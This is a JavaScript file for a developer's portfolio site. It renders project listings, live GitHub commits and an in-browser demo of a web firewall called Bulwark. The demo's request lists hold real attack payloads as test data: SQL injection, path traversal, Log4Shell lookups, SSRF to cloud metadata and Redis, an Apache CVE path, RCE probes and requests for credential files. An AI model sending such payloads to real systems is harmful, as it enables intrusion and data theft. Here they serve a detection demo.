// alex-aero.com — v4
import { SNAPSHOT } from "./snapshot.js?v=4.0.0";
import { film } from "./film.js?v=4.0.0";

const $ = (s, el = document) => el.querySelector(s);
const $$ = (s, el = document) => [...el.querySelectorAll(s)];
const h = (tag, props = {}, ...kids) => {
  const el = document.createElement(tag);
  for (const [k, v] of Object.entries(props)) {
    if (k === "class") el.className = v;
    else if (k.startsWith("on")) el.addEventListener(k.slice(2), v);
    else el.setAttribute(k, v);
  }
  for (const kid of kids.flat()) if (kid != null && kid !== false) el.append(kid.nodeType ? kid : document.createTextNode(kid));
  return el;
};
const REDUCED = matchMedia("(prefers-reduced-motion: reduce)").matches;
const pick = (a) => a[(Math.random() * a.length) | 0];
const rand = (a, b) => a + Math.random() * (b - a);

function ago(iso) {
  const s = Math.max(0, (Date.now() - new Date(iso)) / 1000);
  if (s < 3600) return `${Math.max(1, (s / 60) | 0)}m ago`;
  if (s < 86400) return `${(s / 3600) | 0}h ago`;
  if (s < 86400 * 30) return `${(s / 86400) | 0}d ago`;
  if (s < 86400 * 365) return `${(s / 86400 / 30) | 0}mo ago`;
  return `${(s / 86400 / 365) | 0}y ago`;
}
function splitVersion(msg) {
  const m = /^(?:[\w-]+ )?v?(\d+\.\d+\.\d+)\s*[:—-]\s*(.*)$/.exec(msg);
  return m ? [m[1], m[2]] : [null, msg];
}

/* ───────── projects ───────── */
const P = {
  "aegis-burrow": { name: "Aegis × Burrow", logo: "aegis-burrow" },
  bulwark: { name: "Bulwark", logo: "bulwark" },
  "animated-fiesta": { name: "Selkies Forge", logo: "forge", owner: "adatskov-wcpss",
    desc: "Any Linux machine, even a Raspberry Pi, becomes a launch pad for 153 Linux desktops in the browser. It downloads or builds the desktop, starts it in Docker, checks that it really works, and hands you a link. One file." },
  "burrow-pages": { name: "Burrow Pages", logo: "burrow-pages",
    desc: "Static sites from your GitHub or GitLab repos, an upload, or a site that lives elsewhere, on your own subdomains behind a password. Every push goes live. A Burrow extension." },
  selfmail: { name: "selfmail", logo: "selfmail",
    desc: "A real mail server with a modern webmail app, for home servers that can't open port 25. Postfix and DKIM in one script, DNS through Cloudflare, undo send, every domain in one inbox." },
  weft: { name: "Weft", logo: "weft",
    desc: "The addon format behind Selkies Forge and Aegis × Burrow: one manifest and five bash scripts, and a mesh where running addons find each other. Ships a validator and a brief for AI agents." },
  "alex-aero-workers": { name: "Alex·Aero Workers", mono: "AX",
    desc: "Cloudflare Workers on your own machine. JS and TS in workerd, Python, Shell or HTML, with KV, cron, versions with rollback and live logs. On your domain through a tunnel." },
  "termix-autoupdate": { name: "termix-autoupdate", logo: "termix",
    desc: "Keeps a Docker Termix, its BG Shell and Updater plugins (mine), and Aegis × Burrow up to date by themselves, daily." },
  "onedrive-api": { name: "OneDrive Explorer", mono: "OD",
    desc: "A single-file Flask OneDrive explorer: sign-in inside the app, streaming straight from Microsoft's CDN, an Ace editor and its own media players." },
  "microvm-playground": { name: "MicroVM Playground", mono: "VM",
    desc: "Disposable Linux playgrounds with a real terminal in the browser, on container, Firecracker or QEMU backends." },
};
const repoUrl = (id) => `https://github.com/${P[id]?.owner || "alexd-aero"}/${id}`;
const mark = (id, cls = "") => P[id]?.logo ? h("img", { src: `assets/brand/${P[id].logo}.svg`, alt: "", class: cls }) : h("span", { class: "w-mono " + cls }, P[id]?.mono || "·");
const WORK = ["animated-fiesta", "burrow-pages", "selfmail", "weft", "alex-aero-workers", "termix-autoupdate", "onedrive-api", "microvm-playground"];
const COMMIT_REPOS = ["aegis-burrow", "bulwark", "animated-fiesta", "burrow-pages", "selfmail", "weft", "alex-aero-workers", "termix-autoupdate"];

/* ───────── small things ───────── */
function nav() {
  const bar = $("#nav");
  const on = () => bar.classList.toggle("solid", scrollY > 30);
  addEventListener("scroll", on, { passive: true }); on();
  const links = new Map($$(".nav nav a").map((a) => [a.getAttribute("href").slice(1), a]));
  const io = new IntersectionObserver((es) => {
    for (const e of es) if (e.isIntersecting) for (const [id, a] of links) a.classList.toggle("on", id === e.target.id);
  }, { rootMargin: "-45% 0px -50% 0px" });
  for (const id of links.keys()) { const s = document.getElementById(id); if (s) io.observe(s); }
}
function reveal() {
  const io = new IntersectionObserver((es) => { for (const e of es) if (e.isIntersecting) { e.target.classList.add("in"); io.unobserve(e.target); } }, { rootMargin: "0px 0px -6% 0px" });
  for (const el of $$(".banner, .split, .burrow-grid, .burrow-list, .bwc, .work, .commits, .cmd")) { el.classList.add("reveal"); io.observe(el); }
}
function copyButtons() {
  for (const b of $$(".copy")) b.addEventListener("click", async () => {
    try { await navigator.clipboard.writeText($("#" + b.dataset.copy).textContent.trim()); b.textContent = "Copied"; b.classList.add("done"); }
    catch { getSelection().selectAllChildren($("#" + b.dataset.copy)); b.textContent = "Selected"; }
    setTimeout(() => { b.textContent = "Copy"; b.classList.remove("done"); }, 1600);
  });
}
function whileVisible(el, fn) {
  let on = false, raf = 0, last = 0, seen = false;
  const loop = (t) => { fn(Math.min(64, t - (last || t)), t); last = t; raf = requestAnimationFrame(loop); };
  const set = (v) => { if (v === on) return; on = v; if (on) { last = 0; raf = requestAnimationFrame(loop); } else cancelAnimationFrame(raf); };
  new IntersectionObserver(([e]) => { seen = e.isIntersecting; set(seen && !document.hidden); }).observe(el);
  document.addEventListener("visibilitychange", () => set(seen && !document.hidden));
}

/* ───────── the film ───────── */
function theFilm() {
  const f = film($("#player"), { reduced: REDUCED });
  const list = $("#chapters"), cap = $("#caption");
  const btns = f.scenes.map((s, i) => {
    const b = h("button", { type: "button", onclick: () => f.jump(i) }, h("b", {}, String(Math.floor(s.start / 60)) + ":" + String(Math.floor(s.start % 60)).padStart(2, "0")), s.chapter);
    list.append(h("li", {}, b));
    return b;
  });
  f.onScene((i, scenes) => {
    if (i < 0) return;
    btns.forEach((b, k) => b.classList.toggle("on", k === i));
    cap.textContent = scenes[i].caption;
  });
}

/* ───────── burrow: the builder and the tunnel ───────── */
function burrow() {
  const port = $("#b-port"), name = $("#b-name"), zone = $("#b-zone"), url = $("#b-url"), note = $("#b-note");
  let mode = "own", who = "login";
  const quickName = () => {
    const w = ["river", "amber", "quiet", "tiger", "lunar", "maple", "cobalt", "orbit", "velvet", "harbor"];
    const s = (name.value || "x").split("").reduce((a, c) => (a * 31 + c.charCodeAt(0)) >>> 0, +port.value || 7);
    return `${w[s % 10]}-${w[(s >>> 4) % 10]}-${w[(s >>> 8) % 10]}-${w[(s >>> 12) % 10]}`;
  };
  function update() {
    port.value = port.value.replace(/\D/g, "").slice(0, 5);
    name.value = name.value.toLowerCase().replace(/[^a-z0-9-]/g, "").slice(0, 30);
    const p = port.value || "3000", n = name.value || `tunnel-${p}`;
    const host = mode === "own" ? `${n}.example.com` : mode === "wild" ? `${n}.tunnel.example.com` : `${quickName()}.trycloudflare.com`;
    zone.textContent = mode === "own" ? ".example.com" : mode === "wild" ? ".tunnel.example.com" : "";
    name.disabled = mode === "quick";
    name.parentElement.style.opacity = mode === "quick" ? 0.45 : 1;
    url.textContent = `https://${host}`;
    $("#out-url").textContent = host;
    $("#out-port").textContent = `127.0.0.1:${p}`;
    const gate = who === "login" ? "behind your Aegis login" : who === "pass" ? "behind a password of its own" : "open to anyone";
    const extra = mode === "wild" ? "Your certificate, served from the VPS relay." : mode === "quick" ? "A random free address; no domain needed." : "A DNS record Burrow made and owns.";
    note.textContent = `→ 127.0.0.1:${p} · ${gate}, Bulwark in front. ${extra}`;
  }
  port.addEventListener("input", update); name.addEventListener("input", update);
  for (const [box, set] of [["#b-mode", (b) => (mode = b.dataset.m)], ["#b-who", (b) => (who = b.dataset.w)]]) {
    $(box).addEventListener("click", (e) => {
      const b = e.target.closest("button"); if (!b) return;
      $$("button", $(box)).forEach((x) => x.classList.toggle("on", x === b)); set(b); update();
    });
  }
  update();

  // light going down the burrow
  const g = $("#tunnel-pk"), arch = $("#tunnel-svg .a2");
  const L = arch.getTotalLength();
  const dots = [];
  for (let i = 0; i < 7; i++) { const c = document.createElementNS("http://www.w3.org/2000/svg", "circle"); c.setAttribute("r", "3.5"); g.append(c); dots.push({ c, k: i / 7, side: i % 2 }); }
  const draw = (dt) => {
    for (const d of dots) {
      d.k = (d.k + dt * 0.00018) % 1;
      // in along one side of the middle arch, out to the light at the end
      const s = d.side ? d.k : 1 - d.k;
      const pt = arch.getPointAtLength(s * L);
      const toLight = Math.max(0, (d.k - 0.82) / 0.18);
      d.c.setAttribute("cx", pt.x + (200 - pt.x) * toLight);
      d.c.setAttribute("cy", pt.y + (215 - pt.y) * toLight);
      d.c.setAttribute("opacity", (1 - toLight) * Math.min(1, d.k * 6));
    }
  };
  if (REDUCED) draw(0); else whileVisible($("#tunnel-svg"), draw);
}

/* ───────── bulwark, live in the page ───────── */
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36";
const CHIPS = [
  ["SQLi", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["../ double-encoded", "/..%252f..%252f..%252fetc%252fpasswd"],
  ["fullwidth ．．／", "/．．／．．／etc/passwd"],
  ["Log4Shell", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["hidden XSS", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"],
  ["Apache CVE-2021-41773", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"],
  ["cloud metadata", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["/.env", "/.env"],
  ["O'Reilly", "/authors?name=O%27Reilly", true],
  ["“select from table”", "/search?q=how+to+select+from+table+where+id+%3D+1", true],
];
const TRAFFIC = [
  ["GET", "/"], ["GET", "/assets/app.3f9c1e.js"], ["GET", "/api/feed?page=2&limit=20"], ["GET", "/search?q=how+to+select+from+table+where+id+%3D+1"],
  ["GET", "/authors?name=O%27Reilly"], ["GET", "/oauth/callback?code=4%2F0AfJohXk&state=eyJhbGciOiJIUzI1NiJ9.eyJyIjoiLyJ9.sig"], ["GET", "/favicon.ico"],
  ["PROPFIND", "/dav/notes/"], ["GET", "/blog/2026/11/hello-world"], ["POST", "/api/session"], ["GET", "/img/cat.webp?w=640"],
  ["GET", "/.env"], ["GET", "/.git/config"], ["GET", "/wp-login.php"], ["GET", "/?id=1%27%20OR%20%271%27%3D%271"],
  ["GET", "/..%252f..%252f..%252fetc%252fpasswd"], ["GET", "/?x=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.7%2Fa%7D"],
  ["GET", "/", "${${::-j}${::-n}di:ldap://198.51.100.7/x}"], ["GET", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"],
  ["GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"], ["GET", "/?u=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"],
  ["GET", "/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"], ["GET", "/．．／．．／etc/passwd"], ["GET", "/?n=%7B%7B7*7%7D%7D"],
  ["GET", "/actuator/env"], ["GET", "/alfa.php"], ["GET", "/shell.php?cmd=id"], ["GET", "/?file=php://filter/convert.base64-encode/resource=index.php"],
  ["GET", "/boaform/admin/formLogin"], ["GET", "/?id=1;DROP%20TABLE%20users--"],
  ["GET", "/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"],
  ["GET", "/?u=gopher://127.0.0.1:6379/_FLUSHALL"], ["GET", "/", "sqlmap/1.8.4#stable (https://sqlmap.org)"], ["TRACE", "/"],
  ["GET", "/xmlrpc.php"], ["GET", "/.aws/credentials"], ["GET", "/docker/containers/json"],
];
const FLAG_NAMES = { double: "double-encoded", unicode: "%u escapes", overlong: "overlong UTF-8", nul: "null bytes", backslash: "backslashes", entity: "HTML entities", fold: "look-alike characters" };
// documentation ranges only: nobody real. A small pool, so addresses come back and get banned.
const POOL = Array.from({ length: 9 }, (_, i) => ["203.0.113.", "198.51.100.", "192.0.2."][i % 3] + (17 + i * 23));
const YOU = "you (this browser)";

async function bulwark() {
  const engineEl = $("#bw-engine");
  let E;
  try {
    const [pl, nm] = await Promise.all([import("./bulwark/payloads.js"), import("./bulwark/normalize.js")]);
    E = { inspect: pl.inspect, cat: pl.categoryById, normalize: nm.normalize };
    const run = (n) => { const t0 = performance.now(); for (let i = 0; i < n; i++) E.inspect({ method: "GET", path: `/?id=1%27%20OR%20%271%27%3D%271&_=${i}${Math.random()}`, ua: UA }); return ((performance.now() - t0) / n) * 1000; };
    run(400);
    const us = run(400);
    engineEl.textContent = `real engine · ≈${us < 10 ? us.toFixed(1) : Math.round(us)} µs per new URL here`;
    engineEl.classList.add("ok");
  } catch { engineEl.textContent = "the engine didn't load in this browser"; return; }

  // the address book: points per address, the same rules as the gate (a payload is 5, 10 bans)
  const score = new Map(), banned = new Set(), cats = new Map();
  let nReq = 0, nDrop = 0, nBan = 0;
  function judge(m, p, ua, ip, count = true) {
    const r = E.inspect({ method: m, path: p, ua });
    let kind = r.score === 3 ? "drop" : r.score === 1 ? "warn" : "pass", ban = false;
    if (!count) return { r, kind, ban, pts: 0 };
    nReq++;
    if (banned.has(ip)) { kind = "ban"; }
    else if (kind === "drop") {
      nDrop++;
      const s = (score.get(ip) || 0) + 5; score.set(ip, s);
      if (s >= 10) { banned.add(ip); ban = true; nBan++; }
    }
    if (r.cat) { const c = E.cat(r.cat); const o = cats.get(r.cat) || { n: 0, c }; o.n++; cats.set(r.cat, o); }
    return { r, kind, ban, pts: score.get(ip) || 0 };
  }
  function stats() {
    $("#k-req").textContent = nReq; $("#k-drop").textContent = nDrop; $("#k-ban").textContent = nBan;
    const top = [...cats.values()].sort((a, b) => b.n - a.n).slice(0, 7), max = top[0]?.n || 1;
    $("#cats").replaceChildren(...top.map(({ n, c }) => h("div", { class: "bar" }, h("span", {}, c?.short || "?"), h("i", { style: `width:${(n / max) * 100}%;background:${c?.color || "#888"}` }), h("b", {}, n))));
  }

  // the probe: requests you send come from "you"
  const form = $("#probe"), input = $("#probe-path"), method = $("#probe-method"), steps = $$("#steps span");
  let timers = [];
  function show(m, path, ua = UA, ip = YOU, count = true) {
    if (!path.startsWith("/")) path = "/" + path;
    const { r, kind, ban, pts } = judge(m, path, ua, ip, count);
    // you get let off after a ban, so you can keep trying things
    if (ban && ip === YOU) { banned.delete(YOU); score.delete(YOU); }
    const n = E.normalize(path);
    timers.forEach(clearTimeout); timers = [];
    steps.forEach((s) => s.classList.remove("lit"));
    const step = REDUCED ? 0 : 90;
    steps.forEach((s, i) => timers.push(setTimeout(() => { steps.forEach((x) => x.classList.remove("lit")); s.classList.add("lit"); }, i * step)));
    timers.push(setTimeout(() => {
      steps.forEach((x) => x.classList.remove("lit"));
      const box = $("#verdict");
      box.className = "verdict " + (ban || kind === "ban" ? "ban" : kind);
      $("#v-badge").textContent = ban ? "banned" : kind === "ban" ? "already banned" : kind === "drop" ? "dropped" : kind === "warn" ? (r.probe ? "probe" : r.label ? "label" : "flagged") : "through";
      $("#v-name").textContent = r.name ? r.name[0].toUpperCase() + r.name.slice(1) : "A normal request";
      const facts = [];
      const add = (k, v) => facts.push(h("dt", {}, k), h("dd", {}, v));
      if (r.cat) { const c = E.cat(r.cat); add("category", h("span", { class: "cat", style: `--cc:${c?.color || "#888"}` }, c?.name || r.cat)); }
      if (r.cves?.length) add("CVE", r.cves.join(", "));
      if (r.det) add("why", r.det);
      if (r.hits?.length > 1) add("hits", r.hits.join(" + "));
      add("request", `${r.pts} points${r.score === 3 ? " (5 or more is a payload)" : ""}`);
      const seen = n.path + (n.query ? "?" + n.query : "");
      if (seen !== path) add("decoded", seen.length > 100 ? seen.slice(0, 100) + "…" : seen);
      const flags = Object.keys(n.flags).filter((f) => FLAG_NAMES[f]);
      if (flags.length) add("undid", h("span", {}, ...flags.map((f) => h("span", { class: "flag" }, FLAG_NAMES[f]))));
      if (count) add("address", `${ip}: ${pts} points${ban ? ", banned" : " (10 bans)"}`);
      add("then", ban ? "Your second payload: banned on every tunnel at once, until you sign in. (This page lets you off, so keep going.)" :
        kind === "ban" ? "Banned addresses get nothing until the ban lifts." :
        kind === "drop" ? (count ? "Dropped with a 404 before your app sees it. One more payload from this address bans it." : "Dropped with a 404 before your app sees it. Two of these from one address ban it.") :
        r.probe ? "Asking for software that may not be here. It only counts if the app answers 404." :
        r.label ? "A label for the log, never a ban by itself." :
        kind === "warn" ? "Points against the address, not enough to drop it alone." :
        "Straight through to the app. No false alarm.");
      $("#v-facts").replaceChildren(...facts);
      stats();
    }, step * 4));
  }
  form.addEventListener("submit", (e) => { e.preventDefault(); show(method.value, input.value.trim() || "/"); });
  for (const [label, p, safe] of CHIPS) $("#chips").append(h("button", { type: "button", class: safe ? "safe" : "", onclick: () => { method.value = "GET"; input.value = p; show("GET", p); } }, label));

  // the feed
  const feed = $("#feed");
  function feedOne() {
    const [m, p, ua] = pick(TRAFFIC);
    const benign = !/[.%$<>{]|wp-|php|admin|actuator|boa|docker|xmlrpc|TRACE/.test(p + m) && !ua;
    const ip = benign ? `10.0.0.${2 + ((Math.random() * 6) | 0)}` : pick(POOL);
    const { r, kind, ban } = judge(m, p, ua || UA, ip);
    const c = r.cat ? E.cat(r.cat) : null;
    const vd = ban ? "banned · every tunnel" : kind === "ban" ? "banned" : kind === "drop" ? "dropped" : kind === "warn" ? (r.probe ? "probe" : "flagged") : "through";
    const row = h("div", { class: `r ${kind === "ban" ? "drop ban" : kind}${ban ? " ban" : ""}`, title: "Open in the console", onclick: () => { method.value = m; input.value = p; show(m, p, ua || UA); $("#probe").scrollIntoView({ behavior: "smooth", block: "center" }); } },
      h("span", { class: "ip" }, ip), h("span", { class: "pth" }, h("s", {}, m + " "), ua ? `${p}  ua: ${ua}` : p),
      h("span", { class: "ct", style: `--cc:${c?.color || "#5b616a"}` }, c?.short || "clean"), h("span", { class: "vd" }, vd));
    feed.prepend(row);
    while (feed.children.length > 9) feed.lastChild.remove();
    stats();
  }
  for (let i = 0; i < 7; i++) feedOne();
  show("GET", input.value, UA, YOU, false);
  let next = 0;
  if (!REDUCED) whileVisible($("#bwc"), (dt, t) => { if (t > next) { feedOne(); next = t + rand(800, 1700); } });
}

/* ───────── work ───────── */
function work() {
  $("#work-list").append(...WORK.map((id) => {
    const p = P[id];
    return h("a", { class: "w-row", "data-repo": id, href: repoUrl(id), target: "_blank", rel: "noopener" },
      mark(id), h("span", { class: "w-name" }, p.name, h("span", { class: "ver" })), h("span", { class: "w-desc" }, p.desc), h("span", { class: "w-meta" }));
  }));
}

/* ───────── live from GitHub ───────── */
const CACHE_KEY = "ax-gh-4", CACHE_MS = 20 * 60 * 1000;
async function github() {
  try { const c = JSON.parse(localStorage.getItem(CACHE_KEY) || "null"); if (c && Date.now() - c.t < CACHE_MS) return { ...c.d, live: true }; } catch {}
  const get = async (p) => { const r = await fetch("https://api.github.com/" + p, { headers: { Accept: "application/vnd.github+json" } }); if (!r.ok) throw new Error(r.status); return r.json(); };
  const res = await Promise.allSettled([get("users/alexd-aero/repos?per_page=100&sort=pushed"), ...COMMIT_REPOS.map((id) => get(`repos/${P[id].owner || "alexd-aero"}/${id}/commits?per_page=6`))]);
  if (res.every((r) => r.status === "rejected")) return { ...SNAPSHOT, live: false };
  const repos = { ...SNAPSHOT.repos };
  if (res[0].status === "fulfilled") for (const r of res[0].value) if (P[r.name]) repos[r.name] = { pushed: r.pushed_at };
  const commits = [];
  res.slice(1).forEach((r, i) => {
    const id = COMMIT_REPOS[i];
    if (r.status !== "fulfilled") { commits.push(...SNAPSHOT.commits.filter((c) => c.repo === id)); return; }
    for (const c of r.value) commits.push({ repo: id, sha: c.sha.slice(0, 7), msg: c.commit.message.split("\n")[0], date: c.commit.author.date });
    const d = r.value[0]?.commit.author.date;
    if (d && (!repos[id]?.pushed || repos[id].pushed < d)) repos[id] = { pushed: d };
  });
  commits.sort((a, b) => (a.date < b.date ? 1 : -1));
  const d = { at: new Date().toISOString(), repos, commits: commits.slice(0, 24) };
  try { localStorage.setItem(CACHE_KEY, JSON.stringify({ t: Date.now(), d })); } catch {}
  return { ...d, live: true };
}
function render(data) {
  const vers = {};
  for (const c of data.commits) if (!vers[c.repo]) { const [v] = splitVersion(c.msg); if (v) vers[c.repo] = v; }
  for (const el of $$("[data-ver]")) if (vers[el.dataset.ver]) el.textContent = vers[el.dataset.ver];
  if (data.commits[0]) $("#nav-live").textContent = `pushed ${ago(data.commits[0].date)}`;
  $("#commits").replaceChildren(...data.commits.slice(0, 12).map((c) => {
    const [v, rest] = splitVersion(c.msg);
    return h("li", {}, h("a", { href: `${repoUrl(c.repo)}/commit/${c.sha}`, target: "_blank", rel: "noopener" },
      h("time", { datetime: c.date, title: new Date(c.date).toLocaleString() }, ago(c.date)),
      h("span", { class: "repo-n" }, mark(c.repo), P[c.repo]?.name || c.repo),
      h("span", { class: "msg" }, v ? h("b", {}, v) : null, rest),
      h("span", { class: "sha" }, c.sha)));
  }));
  $("#log-src").textContent = data.live ? "The newest commits across my projects, live from GitHub." : `The newest commits across my projects, as of ${new Date(data.at).toLocaleDateString()}.`;
  for (const row of $$(".w-row")) {
    const r = data.repos[row.dataset.repo], v = vers[row.dataset.repo];
    if (v) $(".ver", row).textContent = v;
    if (r?.pushed) $(".w-meta", row).replaceChildren(Date.now() - new Date(r.pushed) < 7 * 864e5 ? h("span", { class: "fresh" }, "● ") : "", `updated ${ago(r.pushed)}`);
  }
}
async function live() {
  render({ ...SNAPSHOT, live: false });
  try { render(await github()); } catch {}
  setInterval(() => { for (const t of $$("#commits time")) t.textContent = ago(t.getAttribute("datetime")); }, 30e3);
}

/* ───────── go ───────── */
nav();
theFilm();
burrow();
work();
copyButtons();
reveal();
live();
bulwark();
